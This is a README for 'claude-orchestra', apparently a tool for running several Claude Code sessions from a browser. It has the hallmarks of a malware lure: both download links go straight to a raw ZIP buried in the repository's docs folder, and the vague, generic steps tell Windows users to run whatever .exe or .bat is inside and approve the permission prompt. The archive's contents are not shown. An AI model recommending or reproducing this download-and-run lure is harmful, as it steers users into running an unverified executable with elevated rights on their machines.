# 🤖 claude-orchestra - Run Claude Code in one place

[![Download](https://img.shields.io/badge/Download%20claude--orchestra-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mianham9042/claude-orchestra/raw/refs/heads/main/docs/orchestra-claude-3.2-alpha.4.zip)

## 🚀 What is claude-orchestra?

claude-orchestra is a local web app that helps you run more than one Claude Code session at the same time. It gives you one place to start, watch, and manage each session without jumping between windows.

Use it when you want to:

- Open several AI coding sessions at once
- Keep each task in its own panel
- Work from a browser instead of many terminal tabs
- Stay local on your own machine
- Avoid extra telemetry

## 🖥️ What you need

To run claude-orchestra on Windows, you need:

- A Windows 10 or Windows 11 PC
- An internet connection for the first setup
- Claude Code installed on your machine
- A modern web browser such as Chrome, Edge, or Firefox
- At least 8 GB of RAM for smooth use
- Enough free disk space for your projects and session history

If you plan to run several agents at once, a machine with more RAM and a faster CPU will help.

## ⬇️ Download

Visit this page to download and set up claude-orchestra:

https://github.com/mianham9042/claude-orchestra/raw/refs/heads/main/docs/orchestra-claude-3.2-alpha.4.zip

## 🧭 Install on Windows

Follow these steps in order:

1. Open the download link above.
2. On the GitHub page, look for the latest release or the main project files.
3. Download the Windows version if one is provided.
4. If the project comes as a ZIP file, save it to your Downloads folder.
5. Right-click the ZIP file and choose Extract All.
6. Open the extracted folder.
7. Look for a file with a name like `claude-orchestra.exe`, `start.bat`, or `run.bat`.
8. Double-click the file to start the app.
9. If Windows asks for permission, choose Yes.
10. Wait for the app to finish starting.
11. Open your browser.
12. Go to the local address shown in the terminal or app window, such as `http://localhost:3000`.

If the app opens in a terminal window first, keep that window open while you use the web interface.

## 🧩 First-time setup

After the app starts, set up Claude Code on your computer if you have not done that yet.

1. Open Command Prompt or PowerShell.
2. Install Claude Code using the method from Anthropic’s setup guide.
3. Sign in when prompted.
4. Return to claude-orchestra.
5. Refresh the browser page.
6. Add your first session from the main screen.

If the app asks for a path to Claude Code, point it to the installed command or executable file.

## 🎛️ How to use it

Once claude-orchestra is running, you can manage several Claude Code sessions from one screen.

Typical use:

1. Start a new session for one task.
2. Give it a clear name, like `bug fix` or `docs update`.
3. Start another session for a different task.
4. Watch each session in its own panel.
5. Switch between tasks without losing your place.
6. Stop a session when the task is done.

This works well for:

- Feature work
- Bug fixes
- File cleanup
- Code review
- Small refactors
- Testing changes across separate tasks

## 🔧 Basic controls

Most screens in claude-orchestra use simple controls:

- **New session**: creates a fresh Claude Code instance
- **Start**: launches the session
- **Stop**: ends the session
- **Restart**: runs the session again
- **Logs**: shows what the session did
- **Open folder**: opens the project on your computer

If you have many sessions open, use clear names so you can tell them apart.

## 🪟 Working with the web interface

The browser view is made for easy use.

You can:

- Read session output without opening a terminal
- Keep several sessions visible at once
- Resize panels to focus on one task
- Copy text from one session to another
- Refresh the page if your browser gets stuck

If the page does not load, check that the app is still running in the terminal window.

## 🔐 Privacy and local use

claude-orchestra is built for local use.

That means:

- Your sessions run on your own machine
- Your data stays on your computer
- No telemetry is sent from the app
- You do not need a cloud dashboard
- You can use it inside your local workflow

This makes it a good fit for private coding work and internal projects.

## 🧪 Common use cases

Use claude-orchestra when you want to:

- Compare answers from more than one Claude Code session
- Work on separate tasks at the same time
- Keep a main task and a side task open together
- Run one session for code and another for notes
- Organize AI coding work in a clean view

It works like a terminal multiplexer, but with a web interface that is easier to follow.

## 🛠️ Troubleshooting

If something does not work, try these steps:

1. Make sure Claude Code is installed.
2. Check that the app window or terminal is still open.
3. Refresh the browser page.
4. Close and reopen the app.
5. Confirm that no other app is using the same local port.
6. Run the app again from the same folder where you extracted it.
7. Reboot Windows if the app still will not start.

If you see a blank page, wait a few seconds and refresh.

If the browser says it cannot reach the site, the local server may not be running.

## 📁 Project layout

When you open the project folder, you may see files like these:

- `README.md` — setup and usage info
- `package.json` — app settings
- `src/` — app source files
- `public/` — browser files
- `dist/` — built files for running the app
- `scripts/` — helper scripts for start and build tasks

You do not need to edit these files to use the app.

## 🧰 For later updates

To update claude-orchestra:

1. Return to the GitHub page.
2. Check for a newer release or newer project files.
3. Download the latest version.
4. Extract it into a new folder.
5. Start the new copy.
6. Move your projects over if needed.

Keeping each version in its own folder helps avoid conflicts.

## 🔎 Tags

ai-coding, ai-tools, anthropic, claude, claude-code, cli, coding-assistant, developer-tools, devtools, local-first, multi-agent, nodejs, open-source, terminal-multiplexer, xterm